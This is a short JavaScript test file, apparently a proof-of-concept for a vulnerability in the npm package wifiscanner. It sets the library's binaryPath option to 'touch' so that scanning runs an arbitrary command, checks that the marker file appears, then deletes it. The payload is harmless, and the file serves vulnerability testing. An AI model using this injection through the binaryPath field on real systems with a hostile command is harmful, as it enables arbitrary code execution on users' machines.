const v21 = () => {
    const v12 = expect.assertions(1);
    v12;
    const fs = require('fs');
    let wifiscanner = require('wifiscanner');
    const sleep = require('sleep');
    const path = './wifiscanner.txt';
    let options = {};
    options.args = './wifiscanner.txt';
    options.binaryPath = 'touch';
    try {
        let scanner = wifiscanner(options);
        const v13 = function (error, networks) {
        };
        const v14 = scanner.scan(v13);
        v14;
    } catch (error) {
        const v15 = console.log(error);
        v15;
    }
    const v16 = sleep.sleep(2);
    v16;
    file_exist = fs.existsSync(path);
    const v17 = expect(file_exist);
    const v18 = v17.toBe(true);
    v18;
    const v19 = function (err) {
    };
    const v20 = fs.unlink(path, v19);
    v20;
};
const v22 = test('Arbitrary code execution in wifiscanner', v21);
v22;